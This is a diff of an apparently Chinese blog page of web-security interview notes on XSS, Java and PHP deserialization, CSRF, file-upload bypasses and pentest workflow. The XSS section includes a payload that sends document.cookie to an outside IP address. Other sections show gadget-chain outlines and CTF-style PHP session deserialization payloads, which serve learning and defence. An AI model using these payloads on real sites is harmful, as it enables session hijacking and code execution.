@@ -87,7 +87,8 @@
 <meta property="og:description" content="之前实习面试时准备的资料，现在论文和工作都差不多定了，想起来可以分享一下，其中很多资料源于网络，也包含了部分自己的理解，现在回馈于网络，希望对准备面试的小伙伴们或许能起到一点帮助 OWASP TOP 10 注入 失效的身份认证（密码转储、字典攻击、钓鱼或社会工程之后发现失效的身份认证） 敏感数据泄漏（攻击者不是直接攻击，而是在传输过程中或从客户端窃取密钥、中间人攻击或者从服务器端窃取明文数据） X">
 <meta property="og:locale" content="default">
 <meta property="og:image" content="https://mdpicture.oss-cn-beijing.aliyuncs.com/20190226215142.png">
-<meta property="og:updated_time" content="2020-03-16T10:34:12.673Z">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-1cf2ea307bdeb74a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:updated_time" content="2020-03-16T10:37:32.188Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Web安全面试准备一">
 <meta name="twitter:description" content="之前实习面试时准备的资料，现在论文和工作都差不多定了，想起来可以分享一下，其中很多资料源于网络，也包含了部分自己的理解，现在回馈于网络，希望对准备面试的小伙伴们或许能起到一点帮助 OWASP TOP 10 注入 失效的身份认证（密码转储、字典攻击、钓鱼或社会工程之后发现失效的身份认证） 敏感数据泄漏（攻击者不是直接攻击，而是在传输过程中或从客户端窃取密钥、中间人攻击或者从服务器端窃取明文数据） X">
@@ -717,6 +718,333 @@
 <p>exercise：<a href="https://github.com/FatDong1/cross-domain" target="_blank" rel="noopener">https://github.com/FatDong1/cross-domain</a></p>
 </li>
 </ul>
+<h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><ul>
+<li>本质：HTML注入（将数据解析为html代码或js代码执行）</li>
+<li>三种类型：<ol>
+<li>反射型：用户输入直接反射给浏览器（不存储到数据库）</li>
+<li>存储型：用户输入— 数据库— 浏览器渲染</li>
+<li>DOM型：通过js（如document.write、xxx.innerHTML等）添加DOM节点— 浏览器渲染</li>
+</ol>
+</li>
+</ul>
+<h4 id="XSS危害"><a href="#XSS危害" class="headerlink" title="XSS危害"></a>XSS危害</h4><ol>
+<li>Cookie劫持 — HttpOnly标识（禁止js读取cookie）— XST（利用TRACE调试：会将请求头作为Response Body返回）</li>
+<li>控制用户的浏览器：<ul>
+<li>GET请求：如插入一张图片，图片链接为删除某篇文章的url，攻击者只需要让博主执行这段js代码，就可以删除文章（类似于CSRF）</li>
+<li>POST请求：通过js模拟浏览器发送请求，发送请求的方式有两种：form和XMLHttpRequest<ul>
+<li>写html代码构造<strong>form表单</strong>，自动提交表单 — 防御： 验证码 </li>
+<li>通过<strong>XMLHttpRequest</strong> post方法</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>XSS钓鱼：修改密码 — 需要输入old password — 构造伪登录的页面</li>
+<li>识别用户的浏览器、识别用户安装的软件（挂马攻击）</li>
+<li>BeEF：可以将被害人的主机变成伪僵尸网络的一部分，窃取内存信息、把受害人重定向恶意链接、开启摄像头等多种类型的攻击</li>
+<li>终极利用方式：XSS Worm</li>
+</ol>
+<h4 id="XSS构造技巧"><a href="#XSS构造技巧" class="headerlink" title="XSS构造技巧"></a>XSS构造技巧</h4><p><a href="https://pentesterlab.com/exercises/xss_and_mysql_file/course" target="_blank" rel="noopener">https://pentesterlab.com/exercises/xss_and_mysql_file/course</a></p>
+<p>防御方式：并未过滤</p>
+<p>payload：<code>&lt;script&gt;document.write(&quot;&lt;img src=&#39;http://123.207.153.65:9999?cookie=&quot;+document.cookie+&quot; &#39;/&gt;&quot;);&lt;/script&gt;</code></p>
+<ol>
+<li>转义— GBK编码绕过，转义双引号时<code>%c1</code>组成一个新的Unicode字符</li>
+<li>长度限制— 利用事件缩短长度、利用location.hash（没有限制,但url有限制）、利用注释符通过注释中间html代码绕过长度限制</li>
+<li>base标签：攻击者通过base标签设置为自己的vps地址，就劫持了当前页面的相对路径，就可以在自己vps上伪造图片、链接或脚本</li>
+<li>利用window.name缩短长度如<code>window.name=&#39;document.cookie;alert(name);&#39;</code></li>
+<li>html5一些新标签的使用：<code>&lt;audio&gt; &lt;vedio&gt;</code> 等</li>
+</ol>
+<h4 id="XSS防御"><a href="#XSS防御" class="headerlink" title="XSS防御"></a>XSS防御</h4><p>分为输入端过滤和输出端过滤，分析产生在输出端，所以关键在输出端</p>
+<p>分析XSS的产生在输出端浏览器渲染（MVC中的View层），所以关键在于输出端的过滤。一般模版系统中都对输出变量使用escape处理，即默认html实体编码，</p>
+<ul>
+<li><p>输入检查：类型限制、格式检查、检查的逻辑需放在服务器端，一般过滤或编码<code>&lt; &gt; &#39; &quot;</code>; 匹配XSS的攻击特征，开源XSS Filter的实现（匹配是否有<code>&lt;script&gt;、javascript等</code>  ） 问题：</p>
+<ul>
+<li>无法判断用户数据的输出语境，会产生漏报，如恶意url地址</li>
+<li>可能会改变用户数据的语义</li>
+</ul>
+</li>
+<li><p>输出检查：根据变量输出的不同场景，选择合适的编码（道哥：在正确的地方做正确的编码），合适编码的选取关键要根据浏览器的解析顺序</p>
+<ul>
+<li>html代码：标签、属性 — htmlencode</li>
+<li>js代码：script标签、事件 — JavascriptEncode</li>
+<li>url地址：URLEncode，注意URL中的Protocal和Host部分不能编码，否则估计无法识别这是url地址从而调用url解码了— 如果用户能够控制URL，又不能全部进行编码，应该如果过滤呢？这种情况首先检查变量是否以http://开头（协议白名单），保证不会出现伪协议攻击，再对变量进行URLEncode</li>
+</ul>
+</li>
+<li><p>其他：</p>
+<ul>
+<li>HttpOnly的添加</li>
+<li>DOM型XSS的防御：由于使用js输出DOM节点，所以需要先做JavascriptEncode再根据DOM节点的场景进行合适的编码</li>
+</ul>
+</li>
+<li>浏览器端：CSP的设置</li>
+</ul>
+<h4 id="浏览器解码"><a href="#浏览器解码" class="headerlink" title="浏览器解码"></a>浏览器解码</h4><p>主要是HTML解析、JS解析、URL解析</p>
+<p>浏览器在解析HTML文档时无论按照什么顺序，主要有三个过程：<strong>HTML解析、JS解析和URL解析</strong>，每个解析器负责HTML文档中各自对应部分的解析工作。下面以一篇HTML文档解析来简单的讨论下解析器如何协同工作的。</p>
+<p>首先浏览器接收到一个HTML文档时，会触发<strong>HTML解析器</strong>对HTML文档进行<strong>词法解析</strong>，这一过程<strong>完成HTML解码并创建DOM树</strong>，接下来<strong>JavaScript解析器会介入对内联脚本进行解析</strong>，这一过程完成JS的解码工作，如果浏览器遇到需要URL的上下文环境，这时URL解析器也会介入完成URL的解码工作，URL解析器的解码顺序会根据URL所在位置不同，可能在JavaScript解析器之前或之后解析。</p>
+<h4 id="富文本XSS防御"><a href="#富文本XSS防御" class="headerlink" title="富文本XSS防御"></a>富文本XSS防御</h4><p>思想：白名单</p>
+<ul>
+<li><p>标签和属性应该使用白名单</p>
+</li>
+<li><p>事件和一些危险的标签如<code>&lt;base&gt; &lt;iframe&gt; &lt;script&gt; &lt;form&gt;</code>等应该被禁止</p>
+</li>
+<li>开源的XSS Filter 如在PHP中，HTMLPutify</li>
+</ul>
+<ol>
+<li>模版引擎与XSS防御</li>
+<li>Markdown与XSS防御</li>
+</ol>
+<h3 id="Java反序列化"><a href="#Java反序列化" class="headerlink" title="Java反序列化"></a>Java反序列化</h3><p>漏洞本质：不可信的输入和未检测反序列化对象安全性</p>
+<p>反序列化：将对象的状态信息转换为可以存储或传输的字节流形式的过程 </p>
+<p>反序列化应用场景：</p>
+<ul>
+<li>HTTP：多平台的通信、管理等</li>
+<li>RMI（Remote Method Invocation）：用于实现远程过程调用的api，基于反序列化，默认端口1099</li>
+<li>JMX（Java Management ）：Java平台上为 应用程序、设备、系统等植入管理功能的框架，JMX可以跨越一系列异构操作系统平台、系统体系结构和网络传输协议，灵活的开发无缝集成的系统、网络和服务管理应用。中间件软件 WebLogic 的管理页面就是基于 JMX 开发的，而 JBoss 则整个系统都基于 JMX 构架。</li>
+</ul>
+<p>漏洞成因：Java程序使用ObjectInputStream对象的readObject方法将反序列化数据转换为java对象。但当输入的反序列化的数据可被用户控制，那么攻击者即可通过构造恶意输入，让反序列化产生非预期的对象，在此过程中执行构造的任意代码。</p>
+<h4 id="POP利用链"><a href="#POP利用链" class="headerlink" title="POP利用链"></a>POP利用链</h4><p>Java的反射机制：见Java速成</p>
+<p>POC构造：<a href="https://p0sec.net/index.php/archives/121/" target="_blank" rel="noopener">https://p0sec.net/index.php/archives/121/</a></p>
+<p>我的理解：Java反射调用Runtime.getRuntime.exec(command) — trasform函数自动执行 — LazyMap的get基础方法 — getValue — TiedMapEntry的toString — 需要寻找一个类重载readObject且调用toString — BadAttributeValueExpException — 然后传入的形参为私有变量(利用Java反射给私有变量赋值) — 利用ObjectOutputStream的writeObject构造POC</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    Gadget chain:</span></span><br><span class="line"><span class="comment">        ObjectInputStream.readObject()</span></span><br><span class="line"><span class="comment">            AnnotationInvocationHandler.readObject()</span></span><br><span class="line"><span class="comment">                AbstractInputCheckedMapDecorator$MapEntry.setValue()</span></span><br><span class="line"><span class="comment">                    TransformedMap.checkSetValue()</span></span><br><span class="line"><span class="comment">                        ConstantTransformer.transform()</span></span><br><span class="line"><span class="comment">                        InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                            Method.invoke()</span></span><br><span class="line"><span class="comment">                                Class.getMethod()</span></span><br><span class="line"><span class="comment">                        InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                            Method.invoke()</span></span><br><span class="line"><span class="comment">                                Runtime.getRuntime()</span></span><br><span class="line"><span class="comment">                        InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                            Method.invoke()</span></span><br><span class="line"><span class="comment">                                Runtime.exec()</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Requires:</span></span><br><span class="line"><span class="comment">        commons-collections &lt;= 3.2.1</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">	Gadget Chain</span></span><br><span class="line"><span class="comment">		ObjectInputStream.readObject()</span></span><br><span class="line"><span class="comment">			BadAttributeValueExpException.readObject()</span></span><br><span class="line"><span class="comment">				TiedMapEntry.toString()</span></span><br><span class="line"><span class="comment">					LazyMap.getValue()</span></span><br><span class="line"><span class="comment">						LazyMap.get()</span></span><br><span class="line"><span class="comment">							ConstantTransformer.transform()</span></span><br><span class="line"><span class="comment">							InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">								Method.invoke()</span></span><br><span class="line"><span class="comment">									Class.getMethod()</span></span><br><span class="line"><span class="comment">                            InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                            	Method.invoke()</span></span><br><span class="line"><span class="comment">                            		Runtime.getRuntime()</span></span><br><span class="line"><span class="comment">                            InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                            	Method.invoke()</span></span><br><span class="line"><span class="comment">                            		Runtime.exec()</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
+<p>面向属性编程：从现有运行环境中寻找一系列的代码调用，然后根据需求构成一组连续的调用链，用以控制程序的执行流程。</p>
+<p>ROP：寻找当前系统环境或内存环境里已经存在的，具有固定地址且带有返回操作的指令集；用于内存溢出控制指令执行流程</p>
+<p>POP：寻找当前环境中已经定义或能动态加载的对象中的属性（函数方法），构成一个调用组合形成一个完整的、具有目的性的操作。用于反序列化过程中控制代码执行流程</p>
+<h4 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h4><ol>
+<li><p>黑盒流量分析：</p>
+<p>在Java反序列化传送的包中，一般有两种传送方式，在TCP报文中，一般二进制流方式传输，在HTTP报文中，则大多以base64传输。因而在流量中有一些特征：</p>
+<ul>
+<li>TCP：必有aced0005，这个16进制流基本上也意味者java反序列化的开始；</li>
+<li>HTTP：必有rO0AB，其实这就是aced0005的base64编码的结果；</li>
+</ul>
+<p>以上意味着存在Java反序列化，可尝试构造payload进行攻击。</p>
+<p>黑盒java的RMI：</p>
+<p>rmi是java的一种远程对象（类）调用的服务端，默认于1099端口，基予socket通信，该通信实现远程调用完全基于序列化以及反序列化。</p>
+</li>
+<li><p>白盒代码审计：</p>
+<ul>
+<li><p>观察实现了Serializable接口的类是否存在问题。</p>
+</li>
+<li><p>观察重写了readObject方法的函数逻辑是否存在问题。</p>
+</li>
+<li><p>定向功能分析：重点关注数据传输和存储的功能点：数据传输、网络通信、导入模板文件、DB数据库存储、日志格式化存储等业务场景</p>
+</li>
+<li><p>敏感函数回溯：搜索代码中反序列化函数的调用</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream.readObject</span><br><span class="line">ObjectInputStream.readUnshared</span><br><span class="line">XMLDecoder.readObject</span><br><span class="line">Yaml.load</span><br><span class="line">XStream.fromXML</span><br><span class="line">ObjectMapper.readValue</span><br><span class="line">JSON.parseObject</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>观察反序列化时是否重写readObject方法，重写过程中是否有不合理之处，找到反序列化对象输入点后，再考察Class Path是否有包含Apache Common Collections &lt; 3.2.1等危险库</p>
+</li>
+</ol>
+<h3 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h3><p>反序列化目的是对象的传递，所以如果写示例代码也就是定义一个类（类里可以有各种类型的属性私有、静态、共有等）[<em>这里有一个严重的错误！ps：对象不一定都是类，比如字符串也是对象，不知道php中算不算，但是在自己的理解中对象的概念不应该如此狭隘</em>]，然后生成实体对象，再经过serialize序列化，之后就是传输或存储了。</p>
+<p>比较重要的三个魔术方法：</p>
+<ul>
+<li>__sleep: 相当于序列化的预处理，如果存在此方法，serialize调用之前会先调用它，返回应该被序列化的属性（毕竟对象的所有状态不是应该都被序列化的 Java中这种会利用关键字transient）</li>
+<li>__wakeup：反序列化之前会被调用（对象还原前的初始化数据操作），用于准备反序列化的数据（相当于Java中的readObject方法）</li>
+<li>__toString：当对象被当作字符串打印时会返回的内容，由此方法定义</li>
+</ul>
+<ol>
+<li><h6 id="PHP反序列化对象注入"><a href="#PHP反序列化对象注入" class="headerlink" title="PHP反序列化对象注入"></a>PHP反序列化对象注入</h6><p>绕过<code>__wakeup</code>函数：CVE-2016-7124漏洞，<strong>当序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行</strong></p>
+<p>payload最好写代码自己生成，比如protected属性前面还会加上\00*\00，private前面还会加类名，自己写很容易出错</p>
+</li>
+<li><h6 id="Session反序列化对象"><a href="#Session反序列化对象" class="headerlink" title="Session反序列化对象"></a>Session反序列化对象</h6><p>漏洞原理：不同的引擎存储方式不同</p>
+<ul>
+<li>php_binary 键名的长度对应的ASCII字符＋键名＋经过serialize() 函数反序列处理的值</li>
+<li>php 键名＋竖线＋经过serialize()函数反序列处理的值</li>
+<li>php_serialize serialize()函数反序列处理数组方式</li>
+</ul>
+<p>我们先测试一下php和php_serialize的区别，测试代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>,<span class="string">'php_serialize'</span>);</span><br><span class="line"><span class="comment">//ini_set('session.serialize_handler','php');</span></span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[<span class="string">"test"</span>]=$_GET[<span class="string">"t"</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>输出的结果 php_serialize为t:1:{s:4:”test”;s:4:”1111”;} php的结果为test|s:4:”1111”;<br>所以我们看到，如果我们的$_SESSION[‘ceshi’]=’’|O:8:”students”:0:{}’;’ 那么当我们用php_serialize存储时候，他会是a:1:{s:5:”测试”;s:20:”|O:8:”students”:0:{}”;} 然后当我们用php进行读取的时候，反序列化的结果会是</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  [<span class="string">"a:1:&#123;s:5:"</span>ceshi<span class="string">";s:20:"</span><span class="string">"]=&gt;</span></span><br><span class="line"><span class="string">  object(students)#1 (0) &#123;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://upload-images.jianshu.io/upload_images/11234137-1cf2ea307bdeb74a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+</li>
+</ol>
+<p>Php内部的session存储机制为php_serialize，会存储文件上传信息，也不管是啥吧，肯定包含文件名，可能内部存储的是这种格式<code>t:1:{s:4:&quot;filename&quot;;s:4:&quot;filename_value&quot;;}</code>；客户端可以通过POST <code>session.upload.progress.prefix</code> 读取session文件（读取过程中会反序列化），但本地反序列化设置为php，我们将</p>
+<p>filename=’|O:5:”OowoO”:1:{s:4:”mdzz”;s:36:”print_r(scandir(dirname(<strong>FILE</strong>)));”;}’，将会解析为</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  [<span class="string">"a:1:&#123;s:8:"</span>filename<span class="string">";s:71:"</span><span class="string">"]=&gt;</span></span><br><span class="line"><span class="string">  object(OowoO)#1 (0) &#123;</span></span><br><span class="line"><span class="string">  	 $mdzz = 'print_r(scandir(dirname(__FILE__)));'</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>
+<p>O:5:”OowoO”:1:{s:4:”mdzz”;s:88:”print_r(file_get_contents(“/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php”));”;}</p>
+<ol start="3">
+<li><h6 id="漏洞挖掘-1"><a href="#漏洞挖掘-1" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h6></li>
+</ol>
+<ul>
+<li>反序列化的输入点用户可控</li>
+<li>反序列化类中存在魔术方法</li>
+<li>魔术方法中存在敏感操作</li>
+</ul>
+<ol start="4">
+<li>POP链（面向属性编程）</li>
+<li>扩充</li>
+</ol>
+<p>phpinfo中有两栏：</p>
+<ul>
+<li>master value：php.ini中的内容</li>
+<li>local value：当前目录的设置，可能由于服务器apache的配置（apache的配置会覆盖php.ini的配置）、.htaccess或者代码中ini_set有设置，相当于自定义，自定义的会覆盖默认值（php.ini）SSRF漏洞原理</li>
+</ul>
+<h3 id="CSRF绕过及防御"><a href="#CSRF绕过及防御" class="headerlink" title="CSRF绕过及防御"></a>CSRF绕过及防御</h3><p>CSRF本质：重要操作的所有参数都可以被攻击者猜到（攻击者可以构造出重要操作的url）</p>
+<ol>
+<li>浏览器的Cookie策略，本地cookie的发送及P3P头的推波助澜</li>
+<li>如何CSRF需要POST请求才能触发：<ul>
+<li>构造form表单，自动提交表单</li>
+<li>隐藏页面在一个不可见的iframe中，iframe地址指向CSRF构造页面</li>
+<li>CSRF蠕虫</li>
+</ul>
+</li>
+<li>CSRF防御：<ol>
+<li>验证码：强制用户必须与应用交互，但是不能网站的所有操作都加上验证码，所以只是辅助手段，不能作为主要的手段</li>
+<li>token：防止攻击者可以猜到重要操作的所有参数，就是将参数加密或使用随机数（不可预测性原则的应用），这样攻击者就无法构造出一个完整的URL实施CSRF攻击</li>
+<li>referer校验</li>
+</ol>
+</li>
+<li>Token的使用原则：<ul>
+<li>随机性</li>
+<li>保密性：为<strong>防止通过referer泄漏</strong>，尽量将token放在表单中，将GET请求—&gt;POST以form表单形式提交</li>
+<li>多个token解决多页面共存问题</li>
+<li>XSS可以模拟客户端浏览器执行任何操作，所以在XSS攻击下，攻击者完全可以在请求页面后读出页面内容的Token，然后再构造一个合法的请求（XSRF)</li>
+</ul>
+</li>
+<li>Set-cookie: samesite=”Strict/Lax”</li>
+</ol>
+<h3 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h3><ol>
+<li>场景：上传头像图片、邮件或者论坛的附件</li>
+<li>漏洞：上传web脚本能够被服务器解析<ul>
+<li>上传的文件能够被web容器解析（也就是上传后的目录要是web容器所覆盖的目录）</li>
+<li>用户能够从web上访问这个文件（想想菜刀连接的url）</li>
+</ul>
+</li>
+<li>绕过文件上传检查功能：<ul>
+<li>黑名单后缀；<ol>
+<li><code>%00</code>截断（C、PHP中认为是字符串终止符）</li>
+<li>用后缀别名</li>
+</ol>
+</li>
+<li>判断上传文件的文件头（文件MIME类型）<ol>
+<li>将php脚本附在文件头之后</li>
+<li>exiftools附加在exif部分</li>
+<li>但是最后的后缀依然需要改为php，才能被web容器解析</li>
+</ol>
+</li>
+</ul>
+</li>
+<li>服务器解析：<ul>
+<li>Apache文件解析问题：从后往前解析，直到遇见一个它认识的文件类型</li>
+<li>IIS解析：截断符号；PUT功能导致的文件上传（条件：目录支持写权限+开启了WebDav+勾选了脚本资源访问）</li>
+<li>PHP CGI解析：<a href="http://www.xxx.com/path/test.jpg/notexist.php（notexist.php不存在，所以往前递归查询路径，将test.jpg当作php执行）修改配置cgi.fix_pathinfo=0" target="_blank" rel="noopener">http://www.xxx.com/path/test.jpg/notexist.php（notexist.php不存在，所以往前递归查询路径，将test.jpg当作php执行）修改配置cgi.fix_pathinfo=0</a></li>
+</ul>
+</li>
+<li>防御<ul>
+<li>文件上传目录设置为不可执行（文件上传后做独立存储，做静态文件处理）— web容器无法解析该目录下的文件</li>
+<li>通过白名单判断文件类型（图片可以做压缩和resize处理，破坏其中的可能包含的html或php代码）</li>
+<li>使用随机随改写文件名和文件路径（极大增加攻击成本 攻击者不知道路径和改写后的文件名就无法直接访问该文件）</li>
+</ul>
+</li>
+</ol>
+<h3 id="渗透测试流程"><a href="#渗透测试流程" class="headerlink" title="渗透测试流程"></a><a href="https://pengyang.me/2018/08/20/collect_mes/" target="_blank" rel="noopener">渗透测试流程</a></h3><ol>
+<li>信息收集：<ol>
+<li>Whois查询、子域名、真实目标ip、旁站C段查询（常用的工具有webscancc，NmapZenmap）、、服务器系统版本（nmap -O -Pn）、中间件信息（whatweb）、端口扫描和服务类型探测(nmap -sV -Pn)、数据库类型、 google hacking、历史漏洞收集（乌云）<ul>
+<li>常见的网络服务：Telnet（明文传输 23端口）、SSH（22 SSH弱口令），ftp（21）、数据库服务、远程桌面连接（3389）、DNS(53)、邮件服务（SMTP 25 POP3 110 IMAP 143）</li>
+<li>真实IP：判断网站是否有CDN</li>
+</ul>
+</li>
+<li>web信息收集：CMS类型、敏感目录/文件(.git .svn .DB_store、WEB-INF/web.xml、.mdb、.excel、.word、.zip、.rar .txt)</li>
+</ol>
+</li>
+<li>漏洞发现<ol>
+<li>漏洞扫描：Nessus、 AWVS、Sqlmap</li>
+<li>手工测试：sql注入、xss、xxe、逻辑漏洞、csrf、ssrf、未授权访问、各种框架漏洞、文件包含、命令注入等</li>
+</ol>
+</li>
+<li>漏洞利用：由浅入深、旁敲侧击</li>
+<li>后渗透测试：内网渗透、权限维持、提权提升等</li>
+<li>渗透报告编写</li>
+</ol>
+<h3 id="PHP安全"><a href="#PHP安全" class="headerlink" title="PHP安全"></a>PHP安全</h3><ul>
+<li><p>弱类型对变量的类型没有限制</p>
+<ul>
+<li><p>比较操作符：null == false ‘’ ==false ‘0’ == 0 ‘abcd’ == 0 ‘1abcded’ == 1</p>
+</li>
+<li><p>hash比较：开头为0e将会转换为科学记数法 md5 collision 第三种类型的转换为文件（md5作为文件校验已经不可靠了 两张图片 相同的md5值）</p>
+</li>
+<li><p>内置函数参数的松散性：</p>
+<ul>
+<li>md5传入数组，无法处理数组返回false</li>
+<li>strcmp比较两个str，如果传入数组返回null == false == 0</li>
+<li><code>bool in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] )</code> 没有第三个参数时将会松散的判断，有strict参数时才会判断类型</li>
+</ul>
+<p><a href="https://www.freebuf.com/articles/web/197013.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/197013.html</a></p>
+<p>php5与php7在安全上的区别：</p>
+<ul>
+<li>preg_replace不再支持/e参数</li>
+<li>mysql_*全部被移除 都是预编译了</li>
+<li>unserialize函数增加白名单参数设置类名（可选的）</li>
+<li>十六进制字符串不再被认为是数字</li>
+<li>assert不再默认执行代码（菜刀在实现文件管理器时就是assert），不过可以用eval替换</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>变量覆盖：自定义的参数值替换原有的变量值</p>
+<ul>
+<li>$$（可变变量 一个可变变量获取普通变量的值作为其变量名）、extract、parse_str使用不当 </li>
+<li>常用漏洞场景：foreach遍历数组结合$$ </li>
+</ul>
+</li>
+</ul>
+<h3 id="Session与Cookie"><a href="#Session与Cookie" class="headerlink" title="Session与Cookie"></a>Session与Cookie</h3><p>相同点：</p>
+<ul>
+<li>产生原因是HTTP协议的无状态，于是两者本质就是记录状态</li>
+</ul>
+<p>都是用来进行会话跟踪</p>
+<p>不同点：</p>
+<ul>
+<li><code>Cookie</code> 机制采用的是在客户端保持状态的方案，用来记录用户的一些信息，也是实现 <code>Session</code> 的一种方式</li>
+<li><code>Session</code> 机制采用的是在服务器端保持状态的方案，用来跟踪用户的状态，可以保存在集群、数据库、文件中</li>
+<li>session可以存储多种数据类型，而cookie只能存储字符串</li>
+<li>对于一些安全性比较高的数据，cookie需要进行格式化和加密处理，而session存储在服务器端，安全性相对较高</li>
+</ul>
+<p>Cookie：</p>
+<ul>
+<li><p>cookie其实是一小段文本信息，客户端请求服务器，服务器需要记录该用户的状态，就在响应中添加cookie信息（set-cookie字段），客户端收到保存起来，下次请求会带上cookie，服务器检查cookie，用来辨认用户的状态</p>
+</li>
+<li><p>cookie的内容：名称、值、过期日期、域名和路径(用来限制cookie的作用范围)</p>
+<p><code>Set-Cookie: =[; =][; expires=][; domain=][; path=][; secure][; HttpOnly]</code> 设置了httpOnly客户端js就不能访问Cookie了 —XSS的防御（但并不是全能的，比如XST攻击，就可以通过发送Trace包获取Cookie）</p>
+</li>
+<li><p>分为session cookie和持久cookie：seesion cookie存储在内存中，浏览器关闭会话页面就随之消亡；持久cookie存储在硬盘，为浏览器的不同进程所共享</p>
+</li>
+</ul>
+<p>Session：客户端访问服务器，服务器把客户端信息以session的形式存储，当客户端再次访问时，服务器会在session中查找该用户的状态</p>
+<ul>
+<li>服务器是如何标示每个用户身份的呢？事实上，用户与服务器建立连接的时候，服务器就会给用户分配一个SeesionId</li>
+<li>那SessionId是如何在客户端和浏览器之间传输的呢？其实这个传输的载体就是cookie（通常会见到的cookie中的PHPSESSID字段，有当然还有很多其他的名字）</li>
+<li>如果浏览器禁用了Cookie，Session该如何传输？用下面两种方式<ul>
+<li>URL重写：将sessionId直接附加在url后面</li>
+<li>表单隐藏字段，就是服务器会自动修改表单，添加一个隐藏字段</li>
+</ul>
+</li>
+</ul>
+<h3 id="DNS解析顺序"><a href="#DNS解析顺序" class="headerlink" title="DNS解析顺序"></a>DNS解析顺序</h3><ul>
+<li>查询/etc/hosts有无映射</li>
+<li>查看DNS客户端缓存</li>
+<li>默认DNS服务器（本地DNS服务器）<ul>
+<li>DNS服务器收到查询请求，如果要查询的域名在本地配置的区域资源中，则返回解析结果给客户机，此解析具有权威性</li>
+<li>如果要查询的域名不由本地DNS服务器区域解析，但该服务器已经缓存了此网址的映射关系，则返回此映射，非权威性</li>
+</ul>
+</li>
+<li>根据本地DNS服务器是否设置转发器<ul>
+<li>未设置，则查询13台根服务器，如.com，然后下一级.qq.com 重复步骤知道找到<a href="http://www.qq.com" target="_blank" rel="noopener">www.qq.com</a></li>
+<li>设置转发器，则将请求转发给上一级，然后重复之前的步骤 是否在本地区域资源-》是否缓存-&gt;是否配置转发-〉DNS根服务器-&gt;下一级…</li>
+</ul>
+</li>
+<li>最后都将结果返回未本地DNS服务器，由此DNS服务器再返回给客户机</li>
+</ul>
+<p><strong>DNS在进行区域传输的时候使用TCP协议，其它时候则使用UDP协议</strong>； （UDP适用于负载低（一般不超过512字节），响应速度快）</p>
